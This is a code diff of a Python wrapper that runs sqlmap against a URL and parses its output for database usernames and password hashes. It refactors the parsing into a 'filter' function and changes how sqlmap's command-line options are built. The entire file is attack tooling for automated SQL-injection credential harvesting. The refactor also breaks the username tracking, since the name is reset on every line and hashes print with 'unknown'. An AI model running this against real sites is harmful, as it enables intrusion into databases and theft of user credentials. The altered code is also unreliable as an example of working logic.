@@ -19,9 +19,6 @@ import sqlmap
 
 def main():
 
-    username_re = re.compile(r'\[\*\] (\S+) \[1\]')
-    hash_re = re.compile(r'\s*password hash: (\*[A-F0-9]+)')
-
     # Configure sqlmap
     sqlmap_paths.SQLMAP_ROOT_PATH = SQLMAP_ROOT
     sqlmap_setPaths()
@@ -40,30 +37,41 @@ def main():
         sqlmap_init()
         sqlmap_start()
 
-        sys.stdout = sys.__stdout__
-        username = 'unknown'
+        sys.stdout = sys.__stdout__        
 
         for outline in capturedOutput.getvalue().split('\n'):
-            result = username_re.match(outline)
-            if result:
-                username = result.group(1)
 
-            result = hash_re.match(outline)
-            if result:
-                hash_ = result.group(1)
-                sys.stdout.write("%s %s %s\n" % (url, username, hash_))
-                sys.stdout.flush()
+            filter(outline, url)
+
+def filter(outline, url):
+    """ A simple line-by-line filter, edit this to your needs.
+    The default simply looks for password hashes. """
+
+    username_re = re.compile(r'\[\*\] (\S+) \[1\]')
+    hash_re = re.compile(r'\s*password hash: (\*[A-F0-9]+)')
+
+    username = 'unknown'
+
+    result = username_re.match(outline)
+    if result:
+        username = result.group(1)
+        
+    result = hash_re.match(outline)
+    if result:
+        hash_ = result.group(1)
+        sys.stdout.write("%s %s %s\n" % (url, username, hash_))
+        sys.stdout.flush()
    
 def getSqlmapOptions():
     """ Returns our command line options in sqlmap's internal dict format. """
 
-    temp_sys_argv = sys.argv
-    sys.argv = ['sqlmap.py', '--batch', '--flush-session', '--passwords', '-v', '0', '-u', 'foo']
+    #placeholder for our URL
+    sys.argv.append("-u")
+    sys.argv.append("foo")
+
     options = cmdLineParser().__dict__
-    sys.argv = temp_sys_argv
 
     return options
 
 if __name__ == '__main__':
     main()
-
